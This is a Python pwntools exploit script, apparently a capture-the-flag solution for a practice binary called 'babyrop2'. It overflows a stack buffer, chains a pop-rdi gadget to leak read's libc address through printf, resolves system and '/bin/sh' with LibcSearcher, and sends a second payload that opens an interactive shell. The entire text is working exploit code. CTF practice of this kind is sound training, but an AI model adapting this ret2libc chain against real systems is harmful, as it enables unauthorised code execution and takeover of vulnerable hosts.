from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
elf = ELF("babyrop2")
io = process("babyrop2")
# io = remote('node5.buuoj.cn', 29834)

main_addr = elf.sym['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']


read_got = elf.got['read']

print(f'main {main_addr:#x}')


# puts("/bin/sh");
pop_rdi = 0x0000000000400733    

ret = 0x00000000004004d1

#gdb.attach(io, 'system')

payload = b'a'*(0x20 + 8) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(main_addr)

io.sendafter(b'What\'s your name? ',payload)

io.recvuntil(b"again, ")
io.recvuntil(b'!\n')
read_addr = u64(io.recv(6).ljust(8,b'\0'))

libc = LibcSearcher("read", read_addr)
libcbase = read_addr - libc.dump("read")

system_addr = libcbase + libc.dump("system")
binsh_addr = libcbase + libc.dump('str_bin_sh')


print(f"read_addr {read_addr:#x}")


payload = b'a'*(0x20 + 8)+p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) 

io.sendafter(b'What\'s your name? ',payload)


io.interactive() 